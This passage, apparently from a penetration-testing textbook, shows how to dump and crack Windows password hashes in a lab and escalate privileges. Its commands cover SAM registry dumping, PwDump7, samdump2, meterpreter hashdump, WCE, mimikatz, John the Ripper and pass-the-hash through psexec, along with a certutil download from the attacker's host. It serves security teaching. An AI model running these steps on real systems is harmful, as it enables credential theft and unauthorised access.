+    the **certutil** utility. However, before we can download the binary, we need
+    to navigate to a directory where we have read and write permissions. In this case,
+    we will navigate to the current user's **Desktop** directory.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'We can now use the **certutil** utility to download the binary from the Kali
+    VM onto our target system. This can be done by running the following command on
+    the target system:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: certutil -urlcache -f http://<KALI-VM-IP>/PwDump7.exe PwDump7.exe
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'As shown in the following screenshot, if the transfer is successful, the binary
+    should be downloaded and saved with the name we specified:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 7.13 – certutil successful transfer'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_07_013.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 7.13 – certutil successful transfer
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'We can also save the registry values of the SAM file manually on the target
+    system and use the PwDdump utility to dump the hashes. This can be done by running
+    the following command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: reg save hklm\sam c:\sam
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'If the operation was successful, you should receive a message similar to the
+    one highlighted in the following screenshot:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 7.14 – Dump SAM](Images/B17389_07_014.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 7.14 – Dump SAM
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'We can now execute the binary to dump the hashes by running the following command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: .\PwDump7.exe -s <SAMFILE> <SYSTEM-FILE>
+  prefs: []
+  type: TYPE_NORMAL
+- en: This will dump the Windows hashes from the SAM database, which we will crack
+    in the next section.
+  prefs: []
+  type: TYPE_NORMAL
+- en: In the case of our target system, this technique will not work. However, it
+    is a useful utility and will work on most versions of Windows.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Utilizing SamDump2
+  prefs:
+  - PREF_H3
+  type: TYPE_NORMAL
+- en: 'We can also save the registry values of the SAM file manually on the target
+    system and use the SamDump2 utility to dump the hashes. This can be done by running
+    the following command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: reg save hklm\sam c:\sam
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'If the operation was successful, you should receive a message similar to the
+    one highlighted in the following screenshot:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 7.15 – Dump SAM'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_07_015.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 7.15 – Dump SAM
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'We can now download the SAM file from the root of the filesystem to our Kali
+    VM. This can be done automatically through meterpreter by running the following
+    command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: download sam
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'As highlighted in the following screenshot, the SAM file should be downloaded
+    to our home directory on Kali:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 7.16 – Downloading the SAM file'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_07_016.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 7.16 – Downloading the SAM file
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'We can now use the SamDump2 utility on Kali Linux to dump the hashes from the
+    file. This can be done by running the following command on Kali:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: samdump2 system sam
+  prefs: []
+  type: TYPE_NORMAL
+- en: This will dump the hashes from the SAM file, which we can now crack to obtain
+    the cleartext password.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'This process can also be automated using the **hashdump** meterpreter command,
+    like so:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: hashdump
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'If successful, the output should reveal all the user account hashes on the
+    system, as highlighted in the following screenshot:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 7.17 – Hashdump'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_07_017.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 7.17 – Hashdump
+  prefs: []
+  type: TYPE_NORMAL
+- en: In this particular case, the **hashdump** command gives us all the user account
+    hashes on the system. We can save the hashes into a file called **hashes.txt**
+    on our Kali virtual machine. We will take a look at how to use these hashes in
+    the next section.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Utilizing Windows Credentials Editor
+  prefs:
+  - PREF_H3
+  type: TYPE_NORMAL
+- en: Another great utility we can use to dump password hashes is the **Windows Credentials
+    Editor**, also known as **WCE**. WCE lists logon sessions and their corresponding
+    NTLM hashes. The binary comes pre-packaged with Kali and will need to be run locally
+    on the target system.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'We can upload the binary to the target using meterpreter by running the following
+    command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: upload /usr/share/windows-resources/wce/wce64.exe
+  prefs: []
+  type: TYPE_NORMAL
+- en: In the event you are using a standard command shell, you can use the **certutil**
+    utility to transfer the binary to the target system.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'After transferring the binary to the target system, we can execute the binary
+    by running the following command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: .\wce64.exe
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'This will output a list of logon sessions and their corresponding hashes, as
+    shown in the following screenshot:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 7.18 – WCE hashes'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_07_018.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 7.18 – WCE hashes
+  prefs: []
+  type: TYPE_NORMAL
+- en: In this particular case, we were only able to dump the hashes for the currently
+    logged on users.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'We can also use the **wce.exe** binary to dump the password hashes and their
+    corresponding cleartext equivalents. This can be done by running the following
+    command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: .\wce64.exe -w
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'In this particular case, we retrieved the hashes and cleartext passwords for
+    the vagrant user and the SSH user, as shown in the following screenshot:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 7.19 – WCE cleartext passwords'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_07_019.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 7.19 – WCE cleartext passwords
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'We can also use another great Metasploit post-exploitation module to dump password
+    hashes and access tokens from the system. This can be done by loading the following
+    module after putting your meterpreter session in the background:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: use post/windows/gather/credential/credential_collector
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Now, we need to configure the module and change the relevant module options.
+    In this case, the only option that needs to be configured is the **SESSION** option.
+    We can set the **SESSION** option by running the following command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: set SESSION <SESSION-ID>
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The following screenshot outlines the module option that needs to be configured
+    in order to run the module:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 7.20 – Module options'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_07_020.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 7.20 – Module options
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Now, we can run the module by running the following command in the Metasploit
+    console:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: run
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'If successful, the module should output a list of password hashes and access
+    tokens that can be utilized to elevate our privileges, as shown in the following
+    screenshot:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 7.21 – Credential editor'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_07_021.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 7.21 – Credential editor
+  prefs: []
+  type: TYPE_NORMAL
+- en: In this case, we obtained all the user account hashes from the target system.
+    We will take a look at how to utilize these hashes in the next section.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Utilizing mimikatz
+  prefs:
+  - PREF_H3
+  type: TYPE_NORMAL
+- en: 'We can also utilize the built-in Mimikatz meterpreter module (also known as
+    kiwi). This can be loaded into meterpreter by running the following command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: load kiwi
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Once the module has been loaded, we can dump the contents of the SAM database
+    by running the following command in the meterpreter session:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: lsa_dump_sam
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'This will output a list of all user accounts and their corresponding NTLM hashes,
+    as shown in the following screenshot:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 7.22 – Mimikatz hashes'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_07_022.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 7.22 – Mimikatz hashes
+  prefs: []
+  type: TYPE_NORMAL
+- en: Note
+  prefs: []
+  type: TYPE_NORMAL
+- en: Mimikatz is an open source application that allows attackers to view and save
+    Windows authentication credentials for the purpose of privilege escalation.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Alternatively, you can utilize the Mimikatz executable that comes pre-packaged
+    with Kali Linux. The binary will need to be run locally on the target system and
+    can be automatically uploaded to the target through meterpreter by running the
+    following command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
+  prefs: []
+  type: TYPE_NORMAL
+- en: In the event you are using a standard command shell, you can use the **certutil**
+    utility to transfer the binary to the target system.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Note
+  prefs: []
+  type: TYPE_NORMAL
+- en: Mimikatz requires an elevated shell in order to dump hashes.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'After transferring the binary to the target system, we can execute the binary
+    by running the following command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: .\mimikatz.exe
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'After executing the binary, we will need elevated permissions in order to access
+    the SAM database. This can be done by running the following commands within the
+    Mimikatz prompt:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: token::elevate
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'We can now dump the contents of the SAM database by running the following command
+    in the Mimikatz prompt:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: lsadump_sam
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'If successful, you should retrieve the dumped hashes from the SAM database,
+    as highlighted in the following screenshot:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 7.23 – Mimikatz hash dump'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_07_023.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 7.23 – Mimikatz hash dump
+  prefs: []
+  type: TYPE_NORMAL
+- en: You should now have access to various password hashes for various accounts.
+    However, the account we are interested in is the administrator account as it will
+    provide us with a direct route to elevate our privileges to the highest level.
+  prefs: []
+  type: TYPE_NORMAL
+- en: In the next section, we will begin the process of cracking the password hashes
+    and learn how we can utilize the passwords for authentication.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Cracking Windows hashes
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: We can now use the password hashes we dumped in the previous section for legitimate
+    authentication. However, before we do that, we still need to crack these hashes
+    to obtain the cleartext passwords.
+  prefs: []
+  type: TYPE_NORMAL
+- en: This section will be split into two main subsections. The first part will go
+    over the process of cracking Windows password hashes with John the Ripper, while
+    the second subsection will cover the process of authentication.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Before we can begin dumping and cracking password hashes, we need to take a
+    look at the structure of a typical Windows hash.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'As highlighted in the following screenshot, the hash ID is broken down into
+    four sections:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 7.24 – Hash structure'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_07_024.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 7.24 – Hash structure
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The four sections can be further classified as follows:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: The first section is the username.
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: The second section is the unique RID.
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: The third section is the LM hash.
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: The fourth section is the NTLM hash.
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Now that we understand what makes up a Windows hash, we can begin the hash cracking
+    process.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Cracking Windows hashes with John the Ripper
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: John the Ripper is an open source password security, auditing, and recovery
+    utility that supports a large number of hashes and ciphers. In our case, we will
+    be utilizing John the Ripper to crack Windows NTLM hashes.
+  prefs: []
+  type: TYPE_NORMAL
+- en: John the Ripper comes pre-packaged with Kali Linux, and the first step involves
+    saving the password hashes we dumped in the hash dumping section into a file on
+    Kali Linux, preferably a **.txt** file.
+  prefs: []
+  type: TYPE_NORMAL
+- en: In our case, we will name the file **hashes.txt** and save the file on our **Desktop**
+    directory on Kali Linux.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The contents of your file should like similar to the following:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 7.25 – NTLM hashes'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_07_025.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 7.25 – NTLM hashes
+  prefs: []
+  type: TYPE_NORMAL
+- en: Note
+  prefs: []
+  type: TYPE_NORMAL
+- en: The NTLM hashes should not be on the same line, and no other text or strings
+    should be included in the hash file.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'We can now begin the hash cracking process with John the Ripper by running
+    the following command in Kali Linux:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: sudo john –format=NT hashes.txt
+  prefs: []
+  type: TYPE_NORMAL
+- en: This will initiate the hash cracking process; any cracked hashes will be output
+    with their corresponding password. It is important to note that, depending on
+    the length and strength of the passwords, the cracking process may take a few
+    minutes to a couple of hours or even days.
+  prefs: []
+  type: TYPE_NORMAL
+- en: You may also want to limit the number of hashes in the hash file to the hashes
+    that are the most important, or even the hash for the administrator account.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'In this particular case, John cracked the hashes for the **Administrator**
+    and **vagrant** user accounts, as highlighted in the following screenshot:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 7.26 – Cracked hashes'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_07_026.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 7.26 – Cracked hashes
+  prefs: []
+  type: TYPE_NORMAL
+- en: Now that we have obtained the cleartext password for the administrator account,
+    we can begin the authentication process.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Authentication
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: We can use the dumped hashes and cleartext passwords to authenticate with the
+    target to obtain privileged access. This process can be facilitated through various
+    techniques. We will be taking a look at some of them in this subsection.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Using the pass the hash technique
+  prefs:
+  - PREF_H3
+  type: TYPE_NORMAL
+- en: The first technique we will be using is known as *pass the hash*. It involves
+    authenticating with a target using the dumped hash – in this case, the administrator
+    hash. This attack can be automated with a Metasploit module that leverages the
+    **PsExec** command-line utility on Windows. This utility allows you to execute
+    programs on remote systems.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'We can load the module in Metasploit after putting our meterpreter session
+    in the background by running the following command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: use exploit/windows/smb/psexec
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'After loading the module, we need to configure the module options. In this
+    case, we need to configure the **RHOSTS** option and configure the **Server Message
+    Block** (**SMB**) credentials. We set **SMBUser** to **Administrator** and the
+    **SMBPass** option to the administrator hash, as highlighted in the following
+    screenshot:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 7.27 – psexec module options'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_07_027.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 7.27 – psexec module options
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'After configuring the module options, we can launch the module by running the
+    following command in the Metasploit console:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: run
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'As highlighted in the following screenshot, if the module runs successfully,
+    we should receive a meterpreter session with elevated privileges:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 7.28 – Pass the hash was successful'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_07_028.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 7.28 – Pass the hash was successful
+  prefs: []
+  type: TYPE_NORMAL
+- en: With that, we've successfully elevated our privileges by utilizing password
+    hashes.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Using Remmina
+  prefs:
+  - PREF_H3
+  type: TYPE_NORMAL
+- en: During the initial Nmap scan of our target, we identified the **Remote Desktop
+    Protocol** (**RDP**) service running on the default configured port; that is,
+    **3389**. We can utilize the cleartext password we cracked for the administrator
+    account to authenticate with the server and initiate a remote desktop connection
+    with elevated privileges.
+  prefs: []
+  type: TYPE_NORMAL
+- en: This can be facilitated by using an RDP client such as Remmina, which comes
+    pre-packaged with Kali Linux.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'You can launch Remmina through the application launcher menu or through the
+    Terminal. Once you''ve done this, you will need to enter the target IP address,
+    as shown in the following screenshot:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 7.29 – Remmina IP specification'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_07_029.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 7.29 – Remmina IP specification
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'After specifying the target IP, you will be prompted to provide credentials
+    for authentication. In this case, we will use the administrator credentials, as
+    shown in the following screenshot:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 7.30 – Remmina credentials](Images/B17389_07_030.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 7.30 – Remmina credentials
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'If authentication is successful, we should receive a remote desktop session
+    and should be logged in as the administrator account with elevated privileges,
+    as highlighted in the following screenshot:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 7.31 – Remmina RDP session'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_07_031.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 7.31 – Remmina RDP session
+  prefs: []
+  type: TYPE_NORMAL
+- en: With that, we've successfully elevated our privileges with the passwords hashes
+    we dumped and cracked.
+  prefs: []
+  type: TYPE_NORMAL
+- en: You should now be familiar with the process of searching for and identifying
+    passwords in files, as well as the process of dumping and cracking Windows NTLM
+    hashes for the purpose of elevating privileges.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Summary
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: In this chapter, we learned how to find and identify passwords in Windows configuration
+    files, before looking at the various utilities that can be used to search for
+    specific strings. We also touched on how to find and identify application passwords
+    in configuration files, and how these credentials can be used to extend our domain
+    of control. We ended this chapter by taking an in-depth look at how to dump Windows
+    NTLM hashes and how to crack them to elevate our privileges.
+  prefs: []
+  type: TYPE_NORMAL
+- en: In the next chapter, we will explore the process of privilege escalation through
+    exploiting various Windows services.
+  prefs: []
+  type: TYPE_NORMAL
